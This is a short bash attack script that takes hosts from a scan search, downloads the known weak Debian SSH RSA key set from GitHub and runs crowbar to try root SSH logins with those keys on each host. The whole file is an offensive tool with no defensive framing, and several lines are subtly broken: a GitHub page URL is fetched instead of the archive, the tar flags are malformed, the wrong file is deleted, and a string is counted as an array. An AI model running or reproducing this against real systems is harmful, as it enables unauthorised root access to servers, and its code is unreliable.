#!/usr/bin/env bash

source meuk/globalmeuk.sh

echo "[.] Incompentent bastard "

scanfile=${1:-}

#Currently limited to Debian but you can set it to ssh, Ubunutu, 22 or whatever.
result=$(sh -c "./search.sh ${scanfile} Debian")
if [ -z "$scanfile" ]; then
  echo "naam?"
  exit;
fi

if [ ! -d 'meuk/rsa' ]; then
    echo "[.] One moment. Fetching weak debian rsa keys"
    wget https://github.com/g0tmi1k/debian-ssh/blob/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2
    tar -xfj debian_ssh_rsa_2048_x86.tar.bz2 -C meuk/
    rm debian_ssh_rsa_2048_x86.tar.bz
    rm meuk/rsa/2048/*.pub

fi



echo "[.] Trying ${#result[@]} hosts.. ."
for xhost in $result; do
  echo "[+] SSH on ${xhost}"
  crowbar -b sshkey -s ${xhost}/32 -u root -C meuk/rsa/2048/ -l meuk/logs/crowbar_rsa.log

done